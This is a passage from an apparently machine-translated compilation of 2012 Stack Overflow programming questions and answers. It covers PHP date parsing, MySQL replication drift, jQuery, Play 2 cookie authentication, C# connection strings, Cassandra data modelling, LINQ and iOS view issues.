将这样的日期转换为 php 和我的数据库可以处理的格式的最佳方法是什么。我已经做了一些环顾谷歌的工作，但到目前为止还没有找到太多。

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2012-08-07T13:31:41.273

尝试这个

```
<?php
    $today = date('Y-m-d', strtotime('7 Aug 2012'));
    echo $today;
?> 
```

给`2012-08-07`

您可以通过更改来更改其`Y-m-d`输出`date()`

参考[这个！](http://in3.php.net/manual/en/function.strtotime.php)

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2012-08-07T13:32:33.073

`$date = DateTime::createFromFormat('j M Y', '7 Aug 2012');`如果您知道格式，这是最可靠的方法。`strtotime`猜测这不一定是一件好事，如果日期格式错误，您将不会被告知（即不会抛出异常）。

请参阅此处的手册：[http ://www.php.net/manual/en/datetime.createfromformat.php](http://www.php.net/manual/en/datetime.createfromformat.php)

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2012-08-07T14:13:10.933

我不认为日期格式是标准的。它很可能受到用户设置（例如语言环境）的影响。例如。如果用户定义了葡萄牙语语言环境，我认为日期会有点不同。

使用 jquery 日期选择器，您可以指定[所需的格式](http://jqueryui.com/demos/datepicker/#option-dateFormat)（应用`dateFormat`选项）。然后，您可以安全地编写一个 PHP 脚本，以您定义的格式读取日期。您可以使用`date()`@Bhuvan Rikka 指定的 PHP 函数。

# mysql - MySQL 复制未在 binlog 中运行更新

> ID：11847046
> 
> 赞同：8
> 
> 时间：2012-08-07T13:25:29.273
> 
> 标签：mysql, sql-update, replication

我有一些运行版本 5.1.63 的 mysql 服务器，并且在本周早些时候对从属服务器运行一些查询时，我注意到从属服务器上的一些数据应该使用主服务器上的更新语句删除。

我最初的想法是：

*   团队中的某个人正在更新奴隶，我后来反驳了
*   正在更新的列已更改

因此，我通过运行 mysql 显示状态“表”查询进行了调查。这是针对每台服务器上的测试数据库运行的，以查看数据长度是多少，在很多情况下，它向我显示服务器之间的数据长度不同，但通过眼球查看数据，我可以看到数据是一样，所以我不能用这个方法来查看是否有任何差异，因为它似乎容易出错。

接下来，我为每个表运行了一个简单的（跨所有数据库）行数，以确认行数是相同的 - 它是。

然后我开始在 bin 日志中查找以进行复制。我可以看到应该在日志中清晰可见的更新语句，但更新从未运行。

我需要知道的是：

1.  复制被破坏了吗？我假设它是
2.  如果我创建新的从服务器，我会遇到同样的问题吗？
3.  如何在我的服务器上找出问题的严重程度？

任何帮助表示赞赏。

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2014-09-05T11:17:06.230

If you are using statement based replication then it is easily possible to end up with different results on master and slave due to badly constructed INSERT statements.

INSERT SELECT without ORDER BY, or where the ORDER BY can leave non deterministic results will cause the slaves to diverge from master.

From the MySQL site [http://dev.mysql.com/doc/refman/5.1/en/insert-select.html](http://dev.mysql.com/doc/refman/5.1/en/insert-select.html)

> The order in which rows are returned by a SELECT statement with no ORDER BY clause is not determined. This means that, when using replication, there is no guarantee that such a SELECT returns rows in the same order on the master and the slave; this can lead to inconsistencies between them. To prevent this from occurring, you should always write INSERT ... SELECT statements that are to be replicated as INSERT ... SELECT ... ORDER BY column. The choice of column does not matter as long as the same order for returning the rows is enforced on both the master and the slave. See also Section 16.4.1.15, “Replication and LIMIT”.

If this has happened then your replicas have diverged and the only safe way to bring them back in line is to rebuild them from a recent backup of the master DB. The worst part of this is the error may never cause the replication to fail, yet the results are inconsistent. Normally replication fails when an UPDATE or DELETE statement affects a different number of rows than on master, this is confusing as it was not the UPDATE that actually caused the error and the only way I know to fix the issue is to inspect every INSERT query in the code base!

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-08-28T09:14:16.150

状态详细信息来自 information_schema，它从数据库统计数据中为 Mysql 实例整理数据，并且它在每次执行时都不会保持不变。它可以被认为只是对数据大小（以字节为单位）的粗略估计，而不是索引和数据长度的精确值。它可以用于估计，但不能用于交叉检查。对于复制，您可以检查从属 io 和 sql 与主服务器是否正在运行。和 relay-info 你可能会看到来自 master 和 slave 的相应日志详细信息。

当然（1）的做法是count(*) of tables EOD保证master和slave上表中的数据是否一致。但要准确，（2）采用随机值字段并与主从进行交叉检查。此外，如果您对它不满意，（3）您可以将它们放入 outfile 并获取差异或校验和。我更喜欢（1）和（2）。如果（1）不可能（2）仍然说服我。;)

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2014-04-23T12:54:07.910

有一个用于验证复制的工具，名为 pt-table-checksum

# javascript - 字体大小调整器

> ID：11847048
> 
> 赞同：0
> 
> 时间：2012-08-07T13:25:32.120
> 
> 标签：javascript, jquery

我有一个字体大小调整器，需要包含在一个链接中。例如。单击时显示文本链接“Larger Type”并切换到“Smaller Type”的文本链接。我不知道为什么它会切换类“加/减”但它不会切换文本或在 else 语句之后调用字体调整大小函数？

目前，它第一次单击以调整文本大小并添加减号类，但之后它什么也不做。

[http://jsfiddle.net/infatti/P6SVv/](http://jsfiddle.net/infatti/P6SVv/)

```
var targetContainers = $('.two-thirds');
var newLargerSize = 16;
var newSmallerSize = 14;
$('.resize-font a').click(function(){

if ($(this).hasClass('plus')) {

    $(targetContainers).css('font-size', newLargerSize);

    $(this).text('Smaller Type').toggleClass('minus');

} else {

    $(targetContainers).css('font-size', newSmallerSize);

    $(this).text('Larger Type').toggleClass('plus');

};

}); 
```

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-08-07T13:40:27.507

问题在于 toggleClass()

请看看这会解决你的问题 [http://jsfiddle.net/3w2nG/](http://jsfiddle.net/3w2nG/)

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-08-07T13:32:25.433

您的条件未通过您的切换校准。

您检查是否`a`有 class `plus`，但如果有，则永远不会删除加号，而是删除（或添加）减号。

您应该始终切换 plus，以在它存在时将其删除，并在它不存在时添加它：

```
$('.resize-font a').click(function() {
   var hasPlus = $(this).hasClass('plus');
   $(targetContainers).css('font-size', hasPlus ? newLargerSize : newSmallerSize);

   $(this).text(hasPlus ? 'Smaller Type' : 'Larger Type').toggleClass('plus');
}); 
```

如果您需要减号进行样式设置，则应始终切换两者：

```
$(this).text(hasPlus ? 'Smaller Type' : 'Larger Type').toggleClass('plus minus'); 
```

# java - Java Play2 - 从会话到 cookie

> ID：11847049
> 
> 赞同：4
> 
> 时间：2012-08-07T13:25:32.857
> 
> 标签：java, session, authentication, cookies, playframework-2.0

**更新1：**

**你能给我一个关于如何在 play2 中管理 cookie 和会话的简短示例吗？（记住我功能）**

好的，我想我了解播放身份验证背后的主要概念。

Zentasks 使用会话。我知道会话只存储在服务器上。play2 中的会话已经签名。饼干不是。

如果用户即使关闭浏览器也想登录怎么办？

我需要使用cookie。

我应该怎么办？

我是否创建了一个创建会话的 cookie？

例如

*   用户有一个有效的 cookie
*   获取 cookie val 并创建一个新会话

还是我完全放弃会话而只使用 cookie。因为 cookie 不是由 play2 自动签名的，所以我必须自己做，我做到了。

```
response().setCookie("remember",Crypto.sign(rnd) + "-" + obj.getClass().getName() + "-" + rnd,12000); 
```

（我知道我还没有使用secured and http only标志使其安全）

我只是不想发明一个新的、有缺陷的系统。我希望你能帮我弄清楚如何在 play2 中确保身份验证安全。

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2012-08-07T14:03:07.657

Play 中的[会话范围](http://www.playframework.org/documentation/2.0.2/JavaSessionFlash)只不过是签名（安全）cookie（它们存储在客户端，**而不是**服务器端！）

从上面的文档：

> 重要的是要了解 Session 和 Flash 数据**不** 存储在服务器中，而是使用 Cookie 添加到每个后续 HTTP 请求中。

`logged in`因此您可以通过检查是否`session scope's key` 存在并与您的任何用户匹配来保持状态。

~~*事实上的*会话范围不会自动过期，因此您的用户将一直存在`logged in`，直到他单击`logout`操作链接（您只需在其中销毁会话的密钥）~~（仅在某些浏览器中）

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-09-06T14:02:41.833

这对我帮助很大

[http://bazaar.launchpad.net/~opensource21/permsec/trunk/view/head:/psec/app](http://bazaar.launchpad.net/~opensource21/permsec/trunk/view/head:/psec/app)

# asp.net - 设置 Umbraco 成员属性

> ID：11847051
> 
> 赞同：1
> 
> 时间：2012-08-07T13:25:42.237
> 
> 标签：asp.net, umbraco

我在尝试访问/编辑 Umbraco 成员属性时遇到了一些麻烦。

我在 Umbraco 中为我的成员创建了一个属性，我可以使用 Umbraco 后端进行设置。

但是，我试图在我自己的代码中访问/编辑这些属性。

```
Member umbracoUser = new Member(1077);
umbracoUser.getProperty("isDisabled").Value = "1"; 
```

将值分配给属性时，我收到一条错误消息

```
Object reference not set to an instance of an object. 
```

我可以访问 umbracoUser 对象上的所有其他内容，例如 LoginName 和 Email 等，但无法获取我创建的属性。

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-08-08T21:19:24.153

是否可以使用[http://our.umbraco.org/projects/website-utilities/umbramvco](http://our.umbraco.org/projects/website-utilities/umbramvco)之类的包将 MVC 添加到 Umbraco 并执行您需要的操作？

Aaron Powell 也有几个关于这个主题的博客：

[http://www.aaron-powell.com/umbraco/using-mvc-in-umbraco-4](http://www.aaron-powell.com/umbraco/using-mvc-in-umbraco-4)

[http://www.aaron-powell.com/umbraco/using-mvc-in-umbraco-4-revisited](http://www.aaron-powell.com/umbraco/using-mvc-in-umbraco-4-revisited)

也许这可能会导致另一种可能成为解决方案的方法。

# c# - c#学生注册系统帮助链接到SQL数据库

> ID：11847053
> 
> 赞同：1
> 
> 时间：2012-08-07T13:25:46.710
> 
> 标签：c#, sql

请帮忙解决这个编码错误？我是 C# 和 SQL 的新手，需要一些快速帮助。

这是我已经拥有的代码，当我调试时出现问题，当我到达时会抛出错误

```
string ConnectionString = ConfigurationManager
                              .ConnectionStrings["Student1"]
                              .ConnectionString; 
```

错误信息是

> 未处理空引用异常。

无论我做什么，我似乎都无法修复这个错误。有任何想法吗？

```
static class Program
public static SqlConnection GetConnection
{
    get
    {
        string ConnectionString = ConfigurationManager
                                      .ConnectionStrings["Student1"]
                                      .ConnectionString;
        SqlConnection con = new SqlConnection(ConnectionString);
        con.Open();
        return con;
    }
} 
```

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2012-08-07T13:28:48.330

您必须验证配置文件中是否有连接字符串

```
<configuration>
  <connectionStrings>
    <add name="Student1"
         connectionString="...."
         providerName="...." />
  </connectionStrings>
  .... 
```

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2012-08-07T13:36:52.297

除了其他答案之外，可能值得指出您收到此错误的原因。

基本上你的代码在这里：

```
string ConnectionString = ConfigurationManager.ConnectionStrings["Student1"].ConnectionString; 
```

正在尝试访问该`ConfigurationManager.ConnectionStrings`集合，如果未找到值，此集合的索引器将返回 NULL（其他一些集合将引发索引超出范围异常）

该值很可能为 NULL，因为您缺少 app.config 中的连接字符串 - 但由于您没有检查索引器返回的连接字符串对象是否为 null 并且您正在尝试使用它的值，所以抛出空引用异常

一个好的检查是：

```
var conn = ConfigurationManager.ConnectionStrings["Student1"];

if(conn == null) throw new Exception("No connection string in config file"); // etc

string ConnectionString = conn.ConnectionString; 
```

这样，如果连接字符串不存在，您可以抛出更有意义的异常

# silverlight - 流式传输，SIlverlight MediaFramework，不在设备中播放

> ID：11847054
> 
> 赞同：1
> 
> 时间：2012-08-07T13:25:54.797
> 
> 标签：silverlight, windows-phone-7, media, http-live-streaming

我正在尝试将视频内容流式传输到 Windows 手机。我正在使用以下代码。“播放器”是此处使用的 Silverlight 媒体播放器。

```
PlaylistItem item = new PlaylistItem(); 
item.DeliveryMethod =  Microsoft.SilverlightMediaFramework.Plugins.Primitives.DeliveryMethods.AdaptiveStreaming;
item.MediaSource = new Uri("http://playready.directtaps.net/smoothstreaming/SSWSS720H264/SuperSpeedway_720.ism/Manifest");
item.VideoHeight = strmPlayer.Height;
item.VideoWidth = strmPlayer.Width;
player.Playlist.Add(item);
player.Play(); 
```

我可以在模拟器中播放它，但在设备上我什么都看不到。谁能纠正我哪里出错了？

我有时会在调试输出窗口中获得此日志。Microsoft.Web.Media.SmoothStreaming.dll 中出现了“System.InvalidOperationException”类型的第一次机会异常

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-08-07T15:49:28.910

您是否使用 Codeplex 提供的最新版 Silverlight 媒体框架？这可能是您正在使用的实现中的一个错误，最新版本可以纠正它吗？否则，很难调查设备上的网络连接与您的模拟器上的网络连接有什么问题。

顺便说一句，您使用的是什么设备？

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-08-08T03:42:49.523

这是带宽问题！我的电脑正在使用高速互联网连接，因此它能够播放流。我的设备已连接到 WIFI 集线器，该集线器在某些时候超出了 pf 范围。当我将设备靠近集线器时，播放了流。

# itextsharp - 打开 PDF（使用 iTextSharp）时如何使 Adob e Reader 中的附件面板可见？

> ID：11847055
> 
> 赞同：1
> 
> 时间：2012-08-07T13:25:53.733
> 
> 标签：itextsharp

有没有办法我可以使用 iTextSharp [addViewerPreference](http://api.itextpdf.com/itext/com/itextpdf/text/pdf/interfaces/PdfViewerPreferences.html#addViewerPreference%28com.itextpdf.text.pdf.PdfName,%20com.itextpdf.text.pdf.PdfObject%29)方法，比如说在 Stamper 或 PdfWriter 对象上，以便在 Adob​​e Reader 中打开生成的 PDF 文件时，附件面板将可见？

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-08-07T15:49:20.223

设置查看器首选项：

```
pdfWriter.ViewerPreferences = PdfWriter.PageModeUseAttachments; 
```

# objective-c - Objective c 在 plist 中为键编写 UISwitch 状态

> ID：11847059
> 
> 赞同：-1
> 
> 时间：2012-08-07T13:26:06.787
> 
> 标签：objective-c

> **可能重复：**
> [如何成功写入 plist？](https://stackoverflow.com/questions/7254596/how-to-write-to-plist-successfully)

我想简单地在 Plist 文件中写入 UISwitch 的布尔状态（true 或 false）。

这是我已经得到的，但 plist 中的值没有改变：

。H

```
#import <UIKit/UIKit.h>

@interface ViewController : UIViewController {

    IBOutlet UISwitch *mySwitch;

}

-(IBAction)changeThingsInPlist:(id)sender;

@end 
```

.m

```
#import "ViewController.h"

BOOL changeThing;
#define PLIST_PATH @"/var/mobile/Library/Preferences/com.myname.plistname.plist"

@interface ViewController ()

@end

@implementation ViewController

- (void)viewDidLoad
{
    [super viewDidLoad];

    changeThing = [[[NSDictionary dictionaryWithContentsOfFile:PLIST_PATH]valueForKey:@"changeThing"]boolValue];

}

-(IBAction)changeThingsInPlist:(id)sender {

    if (mySwitch.on = YES) {
        changeThing = true;
    }
    else {
        changeThing = false;
    }
}

- (void)viewDidUnload
{
    [super viewDidUnload];
    // Release any retained subviews of the main view.
}

- (BOOL)shouldAutorotateToInterfaceOrientation:(UIInterfaceOrientation)interfaceOrientation
{
    return (interfaceOrientation != UIInterfaceOrientationPortraitUpsideDown);
}

@end 
```

我只是想通过切换 uiswitch 来更改 plist 文件中的值（true 或 false）。

我应该使用 NSUserDefaults 吗？:)

我读过它，但我从来没有得到，如何在 NSUserDefaults 中设置 plist 路径

谢谢

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-08-07T19:55:34.017

我会说你应该创建一个 NSString 并根据 UISwitch 的布尔值设置它的值。

```
NSString *valueOfSwitch;
if (mySwitch.on == YES){
valueOfSwitch = [NSString stringWithFormat:@"ON"];
}
else {
valueOfSwitch = [NSString stringWithFormat:@"OFF"];
} 
```

然后你应该像这样将该字符串放在 NSUserDefaults 中。

```
NSUserDefaults *defaults = [NSUserDefaults standardUserDefaults];
[defaults setObject:valueOfSwitch forKey:@"switchValue"];   //remember this for retrieving
[defaults synchronize]; 
```

然后要检索此字符串，请执行此操作。

```
NSUserDefaults *data = [NSUserDefaults standardUserDefaults];
NSString *switchString = [data objectForKey:@"switchValue"]; //same key that you used for saving
[data synchronize]; 
```

从那里你可以用那个字符串做任何你想做的事情。

# java - jsf commandLink 没有正确更新 url

> ID：11847063
> 
> 赞同：3
> 
> 时间：2012-08-07T13:26:27.667
> 
> 标签：java, html, jsf, jakarta-ee, jsf-2

关于 JSF 2 导航机制有一个非常简单的问题：

我有两个视图，称为“ProductEdit”和“ProductList”，带有请求范围的支持 bean（我认为这无论如何都不相关）。我在“ProductEdit”视图中有以下几行

```
 <h:commandLink action="#{product.update('')}">
                <h:outputText value="Update And Return"></h:outputText>
                <f:param name="pageNo" value="#{productlist.pageNo}" />
            </h:commandLink> 
```

当用户单击“ProductEdit”视图中的“更新和返回”链接时，执行指定的操作（JSF 中的相当标准），其结果是“ProductList”视图，用户被定向到该页面没问题. 但是，尽管显示的视图是“ProductList”视图，但该页面的 URL 在我的浏览器中仍然是“ProductEdit”。

当然必须更新 URL，我做错了什么？

希望 BalusC 现在上线了！

* * *

## 回答 #1

> 赞同：4
> 
> 时间：2012-08-07T13:33:14.947

抱歉我之前的回答，您可以`"?faces-redirect=true"`在您的操作返回的链接末尾添加。或者，如果您要使用 PrimeFaces，只需将参数设置`ajax`为`false`.

**编辑**

```
public String update() {
    return "index?faces-redirect=true";
} 
```

我将借用 BalusCs 的[答案](https://stackoverflow.com/questions/4994458/how-can-i-pass-a-parameter-to-a-commandlink-inside-a-datatable)之一- 在这里您可以看到几种方法。

# cassandra - Cassandra 用于无模式数据库、每天数百万个订单表和数百万个查询

> ID：11847064
> 
> 赞同：7
> 
> 时间：2012-08-07T13:26:31.327
> 
> 标签：cassandra

我正在构建一个具有以下特征的数据库：

1.  无模式数据库，每行具有可变数量的列。
2.  数千万条记录，数十列。
3.  每天数百万次查询。
4.  每天写几千条。
5.  查询将过滤多个列（不仅是键）。

我正在考虑按比例构建的 Cassandra。

**我的问题是：**

1.  在这种情况下我需要水平缩放吗？
2.  Cassandra 是否支持多个键指向同一个列族？

* * *

**编辑**

我想确保我理解你的观点。因此，以下示例记录了我从您的回答中得到的信息：

因此，如果我们有以下列系列（它包含一些商店产品及其详细信息）

```
products // column-family name
{
x = {   "id":"x", // this is unique id for the row. 
    "name":"Laptop",
    "screen":"15 inch",
    "OS":"Windows"}
y = {   "id":"y", // this is unique id for the row. 
    "name":"Laptop",
    "screen":"17 inch"}
z = {   "id":"z", // this is unique id for the row. 
    "name":"Printer",
    "page per minute":"20 pages"}
} 
```

而且，我们要添加“名称”搜索参数，我们将创建另一个具有不同行键的 CF 副本，如下所示：

```
products
{
"x:name:Laptop"  = {    "id":"x", 
            "name":"Laptop",
            "screen":"15 inch",
            "OS":"Windows"}
"y:name:Laptop"  = {    "id":"y", 
            "name":"Laptop",
            "screen":"17 inch"}
"z:name:Printer" = {    "id":"z", 
            "name":"Printer",
            "ppm":"20 pages"}
} 
```

同样，为了添加“屏幕”搜索参数：

```
products
{
"x:screen:15 inch" = {  "id":"x" 
            "name":"Laptop",
            "screen":"15 inch",
            "OS":"Windows"}
"y:screen:17 inch" = {  "id":"y", 
            "name":"Laptop",
            "screen":"17 inch"}
} 
```

但是，如果我们想基于 10 个搜索参数或它们的任意组合进行查询（如我的应用程序中的情况），那么我们必须创建列族的 1023 个副本 [(2 的 10 次幂)- 1]。而且由于大多数行都会有很多搜索参数，这意味着我们需要大约 1000 倍的额外存储来对数据进行建模（以这种方式），这并不小，特别是如果我们在原始 CF 中有 10,000,000 行。

**这是您建议的数据模型吗？**

* * *

**另一点：**我不明白为什么创建二级索引会丧失或剥夺无模式模型。

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2012-08-09T15:48:40.017

Cassandra 不是一个数据库，您可以通过行键以外的任何内容进行查询。但是你可以定制你的数据模型来支持这些查询。

我们每天在 6 个 cassandra 节点集群上执行 175,000,000 次查询（很简单！），但我们只使用 row_keys 和列请求数据，因为我们已经让我们的数据模型以这种方式工作。我们不使用索引查询。

为了支持更丰富的查询，我们使用将用作搜索参数的数据对数据进行非规范化，以制作检索数据的键。

**示例：**考虑我们保存以下对象：

```
obj {
   id : xxx //assuming id is a unique id across the system
   p1 : value1
   p2 : value2
} 
```

我们知道我们想通过任何这些参数进行搜索，然后我们将为 column_names 或键保存 obj 的副本，如下所示：

```
"p1:value1:xxx"
"p2:value2:xxx"
"p1:value1:p2:value2:xxx" 
"xxx" 
```

这样我们就可以用 p1 = value1, p2 =value2, p1 = value1 AND p2 = value2 或仅通过它的唯一 id xxx 来搜索 obj。

如果您不想这样做，唯一的其他选择是使用二级索引和索引查询，但这将放弃您问题的“无模式”要求。

* * *

**编辑 - 一个例子。**

我们要保存定义为的对象“产品”

```
class Products{
    string uid;
    string name;
    int screen_size; //in inches
    string os;
    string brand;
} 
```

我们将它序列化为字符串或字节数组（我总是倾向于使用 Jackson Json 或 Protobuf ......两者都可以很好地与 cassandra 一起使用并且速度非常快）。我们将该字节数组放入一列。

现在是重要的部分：创建列名和行键。假设我们要按屏幕分辨率搜索并可能按品牌过滤。我们将屏幕尺寸的桶定义为 ["0_to15", "16_to_21", "21_up"]

给定列：

```
"{uid:"MI615FMDO548", name:"SFG-0098", screen_size:15, os:"Android JellyBean", brand:"Samsung"} 
```

保存一份副本： - key = "brand:Samsung" and column_name = "screen_size:15_uid:MI615FMDO548" - key = "brand:0_to_15" and column_name = "screen_size:15_uid:MI615FMDO548"

为什么要在列名中添加 uid？使所有列名对于唯一产品都是唯一的。

**示例第 2 部分**现在假设我们添加了

```
"{uid:"MI615FMDO548", name:"SFG-0098", screen_size:15, os:"Android JellyBean", brand:"Samsung"}"
"{uid:"MI615FMD5589", name:"SFG-0097", screen_size:14, os:"Android JellyBean", brand:"Samsung"}"
"{uid:"MI615FMD1111", name:"SFG-0098", screen_size:17, os:"Android JellyBean", brand:"Samsung"}"
"{uid:"MI615FMDO687", name:"SFG-0095", screen_size:13, os:"Android JellyBean", brand:"Samsung"}" 
```

我们最终将得到以下列族：

```
Products{
-Row:"brand:Samsung"
=> "screen_size:13_uid:MI615FMDO687":"{uid:"MI615FMDO687", name:"SFG-0095", screen_size:13, os:"Android JellyBean", brand:"Samsung"}"
=> "screen_size:14_uid:MI615FMD5589":"{uid:"MI615FMD5589", name:"SFG-0097", screen_size:14, os:"Android JellyBean", brand:"Samsung"}
=> "screen_size:15_uid:MI615FMDO548":"{uid:"MI615FMDO548", name:"SFG-0098", screen_size:15, os:"Android JellyBean", brand:"Samsung"}"
=> "screen_size:17_uid:MI615FMD1111":"{uid:"MI615FMD1111", name:"SFG-0098", screen_size:17, os:"Android JellyBean", brand:"Samsung"}"
-Row:"screen_size:0_to_15"
=> "brand:Samsung_uid:MI615FMDO687":"{uid:"MI615FMDO687", name:"SFG-0095", screen_size:13, os:"Android JellyBean", brand:"Samsung"}"
=> "brand:Samsung_uid:MI615FMD5589":"{uid:"MI615FMD5589", name:"SFG-0097", screen_size:14, os:"Android JellyBean", brand:"Samsung"}
=> "brand:Samsung_uid:MI615FMDO548":"{uid:"MI615FMDO548", name:"SFG-0098", screen_size:15, os:"Android JellyBean", brand:"Samsung"}"
-Row:"screen_size:16_to_17"
=> "brand:Samsung_uid:MI615FMD1111":"{uid:"MI615FMD1111", name:"SFG-0098", screen_size:17, os:"Android JellyBean", brand:"Samsung"}"
-Row:"uid:MI615FMDO687"
=> "product":"{uid:"MI615FMDO687", name:"SFG-0095", screen_size:13, os:"Android JellyBean", brand:"Samsung"}"
-Row:"uid:MI615FMD5589"
=> "product":"{uid:"MI615FMD5589", name:"SFG-0097", screen_size:14, os:"Android JellyBean", brand:"Samsung"}
-Row:"uid:MI615FMDO548"
=> "product":"{uid:"MI615FMDO548", name:"SFG-0098", screen_size:15, os:"Android JellyBean", brand:"Samsung"}"
-Row:"uid:MI615FMD1111"
=> "product":"{uid:"MI615FMD1111", name:"SFG-0098", screen_size:17, os:"Android JellyBean", brand:"Samsung"}"
} 
```

现在，通过跨列名称使用范围查询，您可以按品牌和屏幕大小进行搜索。

希望这很有用

# php - 通过匹配两个数组来赋值

> ID：11847070
> 
> 赞同：0
> 
> 时间：2012-08-07T13:26:42.587
> 
> 标签：php

我现在感觉真的很愚蠢，因为我记得我做过这样的事情。但现在我的脑袋是空的，这看起来真的是个问题。

我有两个数组。第一的：

```
array (
  0 => 
  array (
    'id' => '1',
    'name' => 'Blizzard',
    'slug' => 'blizzard',
  ),
  1 => 
  array (
    'id' => '2',
    'name' => 'Id Software',
    'slug' => 'id-software',
  ),
  2 => 
  array (
    'id' => '3',
    'name' => 'Capcom',
    'slug' => 'capcom',
  ),
  3 => 
  array (
    'id' => '4',
    'name' => 'Maxis',
    'slug' => 'maxis',
  ),
  4 => 
  array (
    'id' => '5',
    'name' => 'Electronic Arts',
    'slug' => 'electronic-arts',
  ),
) 
```

第二个：

```
array (
  0 => '3',
  1 => '4',
) 
```

我想要做的是，从第二个数组中获取值**并将**其与第一个数组的值匹配。我怎样才能做到这一点？

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-08-07T13:31:34.910

当您说“按值”时，我假设您的意思是按`id`值，在这种情况下，如果您已经知道该`id`值比键小一，您可以这样做：

```
foreach( $second as $id) {
    $key = $id - 1;
    $row = $first[ $key ];
    echo $row['name'];
} 
```

否则，您将不得不循环/搜索特定的`id`：

```
foreach( $second as $id) {
    foreach( $first as $row) {
         if( $row['id'] == $id) {
              echo $row['name']; break;
         }
    }        
} 
```

但是，您可以用来获取包含您想要的元素的数组的另一个技巧是 use [`array_filter()`](http://php.net/array_filter)，如下所示：

```
$second = array( 3, 4);
$keep = array_filter( $first, function( $el) use( $second) { 
    return in_array( $el['id'], $second); 
}); 
```

现在`$keep`将包含您想要的两个值的数组，您可以相应地循环它们。

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-08-07T13:28:35.307

像这样的东西？

```
$new_array = array();
foreach ( $secoundarray as $key => $value ) {
  $new_array[$key] = $firstarray[$value];
} 
```

# windows-services - 如何安装windows服务

> ID：11847071
> 
> 赞同：1
> 
> 时间：2012-08-07T13:26:42.763
> 
> 标签：windows-services

我正在开发一个 MVC .net Web 应用程序。我需要创建一个 Windows 服务，用于从数据库向人员发送邮件。在我准备好我的 Windows 服务之后如何安装它？谁能提供步骤？其实我不知道如何准备服务安装程序

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-08-07T13:29:05.697

这不是特定于 ASP.NET MVC。MVC 是一个开发 Web 应用程序的框架。它与您的 Windows 服务无关。

您需要为您的服务创建一个安装程序项目，该项目将在计算机上安装该服务。这个[页面](http://msdn.microsoft.com/en-us/library/zt39148a.aspx)用示例很好地解释了它。

# linq - LINQ：将字符串拆分为列表

> ID：11847080
> 
> 赞同：0
> 
> 时间：2012-08-07T13:27:20.697
> 
> 标签：linq, split

嗨，我开始使用 linq，但拆分字符串时遇到了一些麻烦：

这是字符串：

a;b;cod1;xx|a;b;cod2;xx|a;b;cod3;xx|a;b;cod4;xx

首先我用'|'分割sring 性格所以我得到了这个结果

```
a;b;cod1;xx
a;b;cod2;xx
a;b;cod3;xx
a;b;cod4;xx 
```

然后我又被';'分开 在第二个索引中将此结果放入列表中

```
cod1
cod2
cod3
cod4 
```

所以有更好的方法来使用 linq ¿？

谢谢！

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-08-07T13:30:30.310

您可以使用`Select`将代码放入一行（但您仍然必须使用`String.Split`）：

```
var s = "a;b;cod1;xx|a;b;cod2;xx|a;b;cod3;xx|a;b;cod4;xx";
var resultlist = s.Split('|').Select(x => x.Split(';')[2]).ToList(); 
```

所以你不必使用`for`/`foreach`循环。

# ios - UIScrollView 重叠弹出 UIViewController

> ID：11847081
> 
> 赞同：2
> 
> 时间：2012-08-07T13:27:25.123
> 
> 标签：ios, uitableview, uiscrollview

我有一个`UIScrollView`包含多个页面的页面，每个页面都包含一个`UITableViewController`（类似于 Reminders-App）。单击每个单元格中的一个单元格`UITableViewControllers`会导致 a`DetailViewController`被推送。

但是，当`DetailViewController`弹出时，它会立即消失在 后面`UIScrollView`，而不是平滑地滑开。我可以看到滑动的下一页`UIScrollView`，但是当`DetailViewController`从最后一页推送时，过渡看起来很好，因为 上没有`UIScrollView`可能与被解雇的内容重叠`DetailViewController`。

**编辑**

这就是我创建视图控制器层次结构的方式（简化）：

调度视图控制器.m：

```
- (void) viewDidLoad {
    // ... 
    for (int i = 0; i < 3; ++i) {
        MyTableViewController *myTableViewController = [[MyTableViewController alloc] initWithNibName:@"MyTableView" bundle:nil];

        [self.scrollView addSubview:myTableViewController];
        [self addChildViewController:myTableViewController];
        [myTableViewController didMoveToParentViewController:self];
    } 
```

这里 `tableView:didSelectCellAtIndexPath:`是`MyTableViewController`：

```
(void)tableView:(UITableView *)aTableView didSelectRowAtIndexPath:(NSIndexPath *)indexPath
    {
        // ... 
        [self.tableView deselectRowAtIndexPath:indexPath animated:YES];

        DetailViewController* detailViewController = [[DetailViewController alloc] initWithNibName:@"DetailView" bundle:nil];
        [self.navigationController pushViewController:detailViewController animated:YES];

    }
} 
```

我在这里做错了什么？这种行为有什么解决方法吗？

* * *

## 回答 #1

> 赞同：6
> 
> 时间：2012-08-07T13:43:42.540

您`UIScrollView`需要的超级视图已`clipsToBounds`设置为 TRUE（`Clip Subviews`如果您以这种方式创建视图，则在界面构建器中调用该选项。）正如您所注意到的，看起来它`UIScrollView`可能正在运行它的超级视图，因为它要大得多，这会导致您的动画看起来很糟糕。剪掉它可以防止这种情况发生。

# javascript - 对象中的错误索引

> ID：11847083
> 
> 赞同：0
> 
> 时间：2012-08-07T13:27:42.640
> 
> 标签：javascript, jquery

我有索引错误的对象。我无法编辑这个，因为我应用这个工作正常。

```
var object = { "aaa": 1, "aaa": 2, "aaa" : 3, "aaa" : 4};
$.each(object, function(key, value){

}); 
```

如何删除 value = 2 和 4 的所有值？

* * *

## 回答 #1

> 赞同：4
> 
> 时间：2012-08-07T13:31:47.123

你不能。每个值都会覆盖文字中的前一个值。

```
$> ({ "aaa": 1, "aaa": 2, "aaa" : 3, "aaa" : 4});
Object
    aaa : 4
$> 
```

